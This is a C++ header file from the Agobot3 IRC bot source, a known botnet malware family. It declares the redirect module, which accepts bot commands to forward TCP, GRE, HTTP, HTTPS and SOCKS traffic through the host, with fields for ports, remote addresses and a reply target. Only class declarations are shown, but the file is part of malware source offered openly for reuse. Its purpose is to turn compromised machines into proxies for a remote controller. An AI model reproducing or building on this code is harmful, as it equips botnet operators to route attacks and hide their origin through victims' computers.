/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __REDIRECT_H__
#define __REDIRECT_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CRedirect : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdTCP, m_cmdGRE, m_cmdHTTP, m_cmdHTTPS, m_cmdSOCKS, m_cmdStop;
	int			 m_iNumThreads;
	bool		 m_bRedirecting;
};

class CRedirectBase : public CThread
{
public:
	CRedirectBase() { m_szType="CRedirectBase"; }
	virtual ~CRedirectBase() { }
	virtual void *Run();

	virtual void StartRedirect();

	CString		 m_sRedirectName;
	CString		 m_sReplyTo;

	// Standard forward params
	int			 m_iLocalPort;
	int			 m_iRemotePort;
	CString		 m_sRemoteAddr;

	// GRE forward params
	CString		 m_sServerAddr;
	CString		 m_sClientAddr;
	CString		 m_sLocalAddr;
	
	bool		 m_bSilent;
	bool		 m_bNotice;

	CRedirect	*m_pRedirect;
};

#endif // __REDIRECT_H__
